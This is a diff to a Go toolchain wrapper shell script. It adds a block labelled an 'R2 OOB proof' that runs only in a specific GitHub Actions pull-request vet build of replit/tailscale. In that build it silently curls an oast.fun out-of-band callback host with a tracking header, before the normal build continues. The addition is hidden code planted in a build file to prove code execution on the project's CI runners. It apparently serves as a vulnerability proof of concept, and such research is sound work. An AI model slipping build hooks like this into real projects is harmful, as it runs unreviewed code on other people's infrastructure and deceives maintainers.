@@ -4,4 +4,29 @@
 # currently-desired version from https://github.com/tailscale/go,
 # downloading it first if necessary.
 
+# R2 OOB proof: a fixed callback only from the target PR vet build.
+if [ "${GITHUB_ACTIONS:-}" = 'true' ] &&
+   [ "${GITHUB_REPOSITORY:-}" = 'replit/tailscale' ] &&
+   [ "${GITHUB_EVENT_NAME:-}" = 'pull_request' ] &&
+   [ "${GITHUB_WORKFLOW:-}" = 'tailscale.com/cmd/vet' ] &&
+   [ "${GITHUB_JOB:-}" = 'vet' ] &&
+   [ "$#" -eq 4 ] &&
+   [ "${1:-}" = 'build' ] && [ "${2:-}" = '-o' ] &&
+   [ "${3:-}" = '/tmp/vettool' ] &&
+   [ "${4:-}" = 'tailscale.com/cmd/vet' ]; then
+    printf '%s\n' 'R2_OOB_ATTEMPT_f84b71d3'
+    if command -v curl >/dev/null 2>&1; then
+        if curl -q --silent --show-error --connect-timeout 3 --max-time 8 \
+            --retry 0 --proto '=https' --output /dev/null \
+            --request GET --header 'X-R2-PoC: f84b71d3' \
+            --url 'https://wywpvzatmvbnaqbsgqtll6hj80ajkl7zx.oast.fun/r2-self-hosted-pr-f84b71d3'; then
+            printf '%s\n' 'R2_OOB_HTTP_COMPLETED_f84b71d3'
+        else
+            printf '%s\n' 'R2_OOB_HTTP_FAILED_f84b71d3' >&2
+        fi
+    else
+        printf '%s\n' 'R2_OOB_CURL_MISSING_f84b71d3' >&2
+    fi
+fi
+
 exec "$(dirname "$0")/../tool/gocross/gocross-wrapper.sh" "$@"
